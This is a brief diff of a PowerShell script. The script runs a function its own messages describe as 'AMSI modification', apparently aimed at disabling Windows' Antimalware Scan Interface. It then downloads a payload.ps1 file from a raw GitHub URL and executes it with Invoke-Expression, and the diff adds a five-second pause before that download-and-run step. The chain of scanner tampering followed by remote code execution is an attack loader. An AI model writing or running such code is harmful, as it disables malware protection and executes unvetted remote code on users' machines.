@@ -163,4 +163,5 @@ function ModAllPShells {
 Write-Host "Starting AMSI modification script..." -ForegroundColor Cyan
 ModAllPShells
 Write-Host "AMSI modification script completed." -ForegroundColor Green
+start-sleep 5 -second
 powershell -Command "$url='https://raw.githubusercontent.com/4kr4m0/ps/refs/heads/main/payload.ps1' ; $scriptContent = Invoke-WebRequest -Uri $url ; Invoke-Expression $scriptContent.Content"
